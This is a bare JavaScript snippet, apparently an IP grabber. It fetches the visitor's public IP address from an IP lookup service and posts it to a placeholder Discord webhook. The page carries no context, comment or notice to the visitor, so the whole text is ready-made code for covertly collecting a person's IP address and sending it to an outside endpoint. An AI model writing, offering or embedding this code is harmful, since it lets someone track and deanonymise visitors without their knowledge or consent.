fetch('https://api.ipify.org')
  .then(response => response.text())
  .then(ip => {
    fetch('YOUR_DISCORD_WEBHOOK', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: ip })
    });
  })
